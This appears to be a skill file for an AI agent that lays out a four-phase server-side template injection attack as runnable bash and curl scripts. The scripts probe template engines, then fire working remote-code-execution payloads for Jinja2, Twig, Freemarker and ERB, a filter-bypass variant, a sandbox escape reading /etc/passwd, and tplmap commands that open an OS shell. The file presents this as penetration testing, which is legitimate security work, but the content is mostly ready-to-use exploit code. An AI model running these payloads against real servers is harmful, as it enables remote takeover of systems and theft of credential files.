---
name: vuln-ssti
description: "Server-Side Template Injection (SSTI) testing — Jinja2/Twig/Freemarker/Velocity/Pebble/Smarty/ERB/Mako detection, template expression probing, RCE via SSTI, sandbox escape. Triggers: 'ssti', 'server side template injection', 'template injection', 'jinja2 injection', 'twig injection', 'freemarker injection', 'erb injection', 'template rce', '{{7*7}}', 'smarty injection'."
---

# Server-Side Template Injection (SSTI)

Inject template expressions into user-controlled inputs to achieve RCE via template engine eval.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"
PARAM="name"  # inject point

# Universal detection probes — math expressions:
PROBES=('{{7*7}}' '${7*7}' '#{7*7}' '<%=7*7%>' '{{7*"7"}}' '${{"7"*7}}' '<#assign x=7*7>${x}' '@(7*7)')

for PROBE in "${PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PROBE'))")
  RESP=$(curl -s "$TARGET/page?$PARAM=$ENCODED")
  if echo "$RESP" | grep -q "49\|SevenSeven"; then
    echo "SSTI DETECTED: $PROBE (rendered: 49)"
  fi
done | tee output/ssti_detect.txt

# Also test in POST body, JSON, headers:
curl -s -X POST "$TARGET/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template": "{{7*7}}"}'

# Tplmap automated detection:
pip3 install tplmap 2>/dev/null
git clone https://github.com/epinna/tplmap.git /tmp/tplmap 2>/dev/null
python3 /tmp/tplmap/tplmap.py -u "$TARGET/page?name=*" 2>&1 | tee output/tplmap_results.txt
```

---

## Phase 2: Engine Fingerprinting

```bash
TARGET="https://TARGET"
PARAM="name"

# Jinja2 vs Twig differentiation:
# {{7*'7'}} → '7777777' in Jinja2, 49 in Twig
curl -s "$TARGET/page?$PARAM=%7B%7B7*%277%27%7D%7D"

# Freemarker:
curl -s "$TARGET/page?$PARAM=%24%7B7*7%7D"  # ${7*7} → 49

# ERB (Ruby):
curl -s "$TARGET/page?$PARAM=%3C%25%3D+7*7+%25%3E"  # <%=7*7%>

# Smarty:
curl -s "$TARGET/page?$PARAM=%7B%24smarty.version%7D"  # {$smarty.version}

# Velocity:
curl -s "$TARGET/page?$PARAM=%23set%28%24x%3D7*7%29%24x"  # #set($x=7*7)$x

# Pebble:
curl -s "$TARGET/page?$PARAM=%7B%257+*+7%25%7D"  # {{7 * 7}}
```

---

## Phase 3: RCE Exploitation

```bash
TARGET="https://TARGET"
PARAM="name"

# Jinja2 RCE (Python):
JINJA2_CMD="id"
# Payload: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
JINJA2_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("'"$JINJA2_CMD"'").read()}}'
curl -s "$TARGET/page?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$JINJA2_PAYLOAD'))")"

# Jinja2 alternative (bypass _):
# {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Twig RCE (PHP):
TWIG_PAYLOAD='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
curl -s "$TARGET/page?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TWIG_PAYLOAD'))")"

# Freemarker RCE (Java):
FM_PAYLOAD='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
curl -s "$TARGET/page?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$FM_PAYLOAD'))")"

# ERB RCE (Ruby):
ERB_PAYLOAD='<%= `id` %>'
curl -s "$TARGET/page?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$ERB_PAYLOAD'))")"

# Using tplmap for automated exploitation:
python3 /tmp/tplmap/tplmap.py -u "$TARGET/page?$PARAM=*" --os-shell
```

---

## Phase 4: Sandbox Escape (Jinja2)

```bash
TARGET="https://TARGET"
PARAM="name"

# Enumerate subclasses to find file read/exec:
# {{''.__class__.__mro__[1].__subclasses__()}}
# Find index of <class 'subprocess.Popen'>

# Read /etc/passwd:
PAYLOAD='{{"".__class__.__mro__[1].__subclasses__()[396]("cat /etc/passwd",shell=True,stdout=-1).communicate()[0].decode()}}'
# Index varies — use tplmap to find correct index

# Tplmap shell:
python3 /tmp/tplmap/tplmap.py -u "$TARGET/page?$PARAM=*" --os-cmd "id; cat /etc/passwd; hostname"
```

---

## Output

Save to `output/`:
- `ssti_detect.txt` — detection probe results
- `tplmap_results.txt` — automated scan output
- `ssti_rce_poc.txt` — exact payload and RCE output

## Next Phase

→ `vuln-rce` for post-RCE steps
→ `pentest-report` for findings documentation
